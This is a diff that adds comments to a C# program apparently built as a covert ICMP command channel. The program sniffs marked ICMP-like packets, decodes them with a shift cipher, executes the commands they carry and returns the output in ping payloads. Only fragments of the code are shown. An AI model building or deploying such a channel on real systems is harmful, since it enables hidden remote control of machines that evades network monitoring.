@@ -52,6 +52,10 @@ namespace Restless
             //runn(devices[4]);
         }
 
+        /// <summary>
+        /// This function opens an interface "Device" an starts looking
+        /// for "jdnq" which are the ICMP-Like packets.
+        /// </summary>
         public static void runn(ICaptureDevice device)
         {
             //Register our handler function to the 'packet arrival' event
@@ -76,7 +80,7 @@ namespace Restless
             device.Close();
         }
 
-        //
+
         /// <summary>
         /// This function uses a shift cipher
         /// </summary>
@@ -106,11 +110,18 @@ namespace Restless
             return string.Join("", numbers.ToArray());
         }
 
+
+        /// <summary>
+        /// This function shifts a string "stringMSG" according to shiftAmount.
+        /// </summary>
         public static string shift(string stringMSG, int shiftAmount)
         {
             var numbers = new List<char>();
             foreach (char c in stringMSG)
             {
+                // I just made this up.
+                // I don't remember what's the right range,
+                // I will fix it if it case problems.
                 if (c > 10 && c < 256)
                 {
                     int value = ((int)c) + shiftAmount;
@@ -152,6 +163,9 @@ namespace Restless
         }
 
 
+        /// <summary>
+        /// Sends a real icmp packet with a payload of output as type 8.
+        /// </summary>
         private static void classicalReply(string ip, string output)
         {
             Ping icmpClient = new Ping();
@@ -167,6 +181,10 @@ namespace Restless
             }
         }
 
+        /// <summary>
+        /// This function should replay with output as a payload +
+        /// send the output via output not Ping object. TODO
+        /// </summary>
         private static void reply(object sender, CaptureEventArgs e, string output)
         {
             string[] lines = output.Split('\n');
@@ -267,6 +285,9 @@ namespace Restless
         }
 
 
+        /// <summary>
+        /// This function executes a string "command" then returns the Process object.
+        /// </summary>
         static Process execute(string command, string fileName)
         {
             Process process = new Process();
